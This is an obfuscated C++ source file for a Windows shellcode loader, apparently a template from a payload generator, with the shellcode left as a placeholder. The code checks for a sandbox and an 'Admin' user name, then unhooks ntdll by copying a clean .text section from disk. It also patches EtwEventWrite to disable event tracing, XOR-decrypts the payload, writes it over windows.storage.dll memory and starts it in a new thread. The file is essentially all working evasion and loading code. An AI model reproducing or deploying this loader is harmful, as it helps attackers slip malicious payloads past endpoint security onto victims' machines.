#include "LrOpuVtOqGyeOvs.h"
#include "Shlwapi.h"


#include <windows.h>
#include <iostream>
#include <psapi.h>

#define FILE_OPEN 0x00000001
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020

typedef VOID(NTAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);

unsigned char JIflFKFMjPja[] = { XOR SHELLCODE WOULD GO HERE };
SIZE_T hJEDVOVrYEnKWVd = sizeof(JIflFKFMjPja);
char fJgcwhQCkDK[] = "DkKCLSoNLmNR";

void xdzXCAXXbJHTsXNF(char* data, size_t data_len, char* key, size_t key_len) {

	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

void HOZazhgBwrFFjn() {

    LPCSTR NXurIXzeFKclOSZv = "C:\\Program Files\\Seal\\Seal.exe";
    if (PathFileExistsA(NXurIXzeFKclOSZv))
    {
        return;
    }
    else
    {
        exit(0);
    }
}

void tDlHiVauEwuxUp() {

    TCHAR vOeMrBpKVt[60];
	DWORD IHbhIbjIQkvOj[60];
	
	GetUserName(vOeMrBpKVt, IHbhIbjIQkvOj);
	if (std::string(vOeMrBpKVt).compare("Admin") == 1) {
		exit(0);
	}

}

void aGwyDVAbHvDNfcm() {
    
    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        exit(0);
    }
    
    LPCWSTR jTYgEhMEkQEBZaF = L"\\??\\C:\\Windows\\System32\\ntdll.dll";
    UNICODE_STRING OZROwkNyUNFDQBf;
    OBJECT_ATTRIBUTES ynfIiiBbMCrh = {};
    _IO_STATUS_BLOCK lPEYtOVkYpSAMsWl = {};
    HANDLE oGtzydKQqriOwiGu = NULL;
    HANDLE GlpbgSNUUmEWEM = NULL;
    LPVOID YeLZuwZheGdQREA = NULL;
    LPVOID FfutFdgclGNqIOgP = NULL;
    HMODULE bpWejrohTxuZTB = NULL;
    MODULEINFO ESfQeMydNYGxlAmb = {};
    PIMAGE_DOS_HEADER MLFIBReokE = 0;
    PIMAGE_NT_HEADERS sNxTPqWGtyteWg = 0;
    PIMAGE_SECTION_HEADER QsNSeVxAevpha = 0;
    LPSTR VSmizHScILxarNN;
    ULONG HzqTSwZhitYayxlL;
    LPVOID uGExZpCEoAWFgXQ = NULL;
    LPVOID cGBSfOrPSQl = NULL;
    SIZE_T ngdGucGLPMHXUMI;
    SIZE_T HPuVeYPNIELKhVP = 0;
    LPVOID KPKjfjQYUTalMTFE;
    HANDLE VzMDhElRYjTSBce = GetCurrentProcess();
    SIZE_T RQgPzbNrbhsdE;
    
    RtlInitUnicodeString(&OZROwkNyUNFDQBf, jTYgEhMEkQEBZaF);
    ynfIiiBbMCrh.Length = sizeof(OBJECT_ATTRIBUTES);
    ynfIiiBbMCrh.ObjectName = &OZROwkNyUNFDQBf;
    
    jQHNPZrkGGfIPGFs(&oGtzydKQqriOwiGu, FILE_READ_ATTRIBUTES | GENERIC_READ | SYNCHRONIZE, &ynfIiiBbMCrh, &lPEYtOVkYpSAMsWl, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    HXgcBFZuWRhFsMtR(&GlpbgSNUUmEWEM, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, NULL, NULL, PAGE_READONLY, SEC_IMAGE, oGtzydKQqriOwiGu);
    fDnbiaXGZpi(GlpbgSNUUmEWEM, VzMDhElRYjTSBce, &YeLZuwZheGdQREA, 0, 0, 0, &ngdGucGLPMHXUMI, ViewShare, 0, PAGE_READONLY);

    bpWejrohTxuZTB = GetModuleHandleA("ntdll.dll");
    
    if (GetModuleInformation(GetCurrentProcess(), bpWejrohTxuZTB, &ESfQeMydNYGxlAmb, sizeof(ESfQeMydNYGxlAmb)) == 0) {
        exit(0);
    }
    
    FfutFdgclGNqIOgP = (LPVOID)ESfQeMydNYGxlAmb.lpBaseOfDll;
    MLFIBReokE = (PIMAGE_DOS_HEADER)FfutFdgclGNqIOgP;
    sNxTPqWGtyteWg = (PIMAGE_NT_HEADERS)((DWORD_PTR)FfutFdgclGNqIOgP + MLFIBReokE->e_lfanew);
    for (SIZE_T i = 0; i < sNxTPqWGtyteWg->FileHeader.NumberOfSections; i++) {
    
        QsNSeVxAevpha = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(sNxTPqWGtyteWg) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        VSmizHScILxarNN = (LPSTR)QsNSeVxAevpha->Name;
        if (!strcmp(VSmizHScILxarNN, ".text")) {
    
            uGExZpCEoAWFgXQ = (LPVOID)((DWORD_PTR)FfutFdgclGNqIOgP + (DWORD_PTR)QsNSeVxAevpha->VirtualAddress);
            cGBSfOrPSQl = (LPVOID)((DWORD_PTR)YeLZuwZheGdQREA + (DWORD_PTR)QsNSeVxAevpha->VirtualAddress);
            ngdGucGLPMHXUMI = QsNSeVxAevpha->Misc.VirtualSize;
    
            KPKjfjQYUTalMTFE = uGExZpCEoAWFgXQ;
    
            FEOpwBxgCn(VzMDhElRYjTSBce, &KPKjfjQYUTalMTFE, &ngdGucGLPMHXUMI, PAGE_EXECUTE_READWRITE, &HzqTSwZhitYayxlL);
            fWjqYDbwxkz(VzMDhElRYjTSBce, uGExZpCEoAWFgXQ, cGBSfOrPSQl, ngdGucGLPMHXUMI, &RQgPzbNrbhsdE);
            FEOpwBxgCn(VzMDhElRYjTSBce, &uGExZpCEoAWFgXQ, &ngdGucGLPMHXUMI, HzqTSwZhitYayxlL, nullptr);
    
        }
    }
    
    szxfzVXTNWYNH(VzMDhElRYjTSBce, YeLZuwZheGdQREA);
    GAQFpVUodIxpYP(GlpbgSNUUmEWEM);
    GAQFpVUodIxpYP(oGtzydKQqriOwiGu);
    FreeLibrary(bpWejrohTxuZTB);
    
}

void FMdScLLFVlljHnH() {

    HANDLE FWaUtWSKcpWiM = GetCurrentProcess();
	UCHAR NeULOumaHVaao[] = { 0x48, 0x33, 0xc0, 0xc3 };
	size_t aADQAgaCEJI = sizeof(NeULOumaHVaao);

	unsigned char GmlJBpuIwFuVg[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	LPVOID nqeGzRNIqXX = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)GmlJBpuIwFuVg);

	DWORD zPLfoEPHHQIMXQw;
	LPVOID aOckyZgBPthnRdc = nqeGzRNIqXX;
	ULONG REPLACE_W_VAR8;

	FEOpwBxgCn(FWaUtWSKcpWiM, &aOckyZgBPthnRdc, &aADQAgaCEJI, PAGE_READWRITE, &zPLfoEPHHQIMXQw);
	fWjqYDbwxkz(FWaUtWSKcpWiM, nqeGzRNIqXX, (PVOID)NeULOumaHVaao, sizeof(NeULOumaHVaao), NULL);
	FEOpwBxgCn(FWaUtWSKcpWiM, &aOckyZgBPthnRdc, &aADQAgaCEJI, zPLfoEPHHQIMXQw, &REPLACE_W_VAR8);

}

void AXqVyFjcjnZgxGbo() {

    HANDLE wmAsEAmZMulNyLn = GetCurrentProcess();
    DWORD pKHPJGloahxGj = NULL;

    CHAR ZjtNoIYmbZ[] = { 'w','i','n','d','o','w','s', '.', 's', 't','o','r','a','g', 'e', '.','d','l','l', 0x0 };
    HMODULE oyTJSfTjKwZxx = LoadLibraryA((LPCSTR)ZjtNoIYmbZ);

    PVOID VJiPkVVAwSNL = oyTJSfTjKwZxx + 0x1000;
    PVOID vRvyKngylLxOGKP = oyTJSfTjKwZxx + 0x1000;
    PVOID CvNaMETOhNc = oyTJSfTjKwZxx + 0x1000;

    xdzXCAXXbJHTsXNF((char*)JIflFKFMjPja, hJEDVOVrYEnKWVd, fJgcwhQCkDK, sizeof(fJgcwhQCkDK));
    SIZE_T qSNpmUzvMJVZHh = sizeof(JIflFKFMjPja);
    FEOpwBxgCn(wmAsEAmZMulNyLn, &VJiPkVVAwSNL, &qSNpmUzvMJVZHh, PAGE_READWRITE, &pKHPJGloahxGj);
    fWjqYDbwxkz(wmAsEAmZMulNyLn, vRvyKngylLxOGKP, JIflFKFMjPja, qSNpmUzvMJVZHh, nullptr);
    FEOpwBxgCn(wmAsEAmZMulNyLn, &CvNaMETOhNc, &qSNpmUzvMJVZHh, PAGE_EXECUTE_READ, &pKHPJGloahxGj);

	HANDLE ykodsdEfIs;
	HzVCOJLhNyaEZsi(&ykodsdEfIs, GENERIC_EXECUTE, NULL, wmAsEAmZMulNyLn, (PTHREAD_START_ROUTINE)vRvyKngylLxOGKP, NULL, FALSE, 0, 0, 0, nullptr);
	getchar();

}

int main() {

    //REPLACE_WITH_DOMATH_FUNCTION_NAME();
    HOZazhgBwrFFjn();
    tDlHiVauEwuxUp();
    aGwyDVAbHvDNfcm();
    FMdScLLFVlljHnH();
    AXqVyFjcjnZgxGbo();
    
}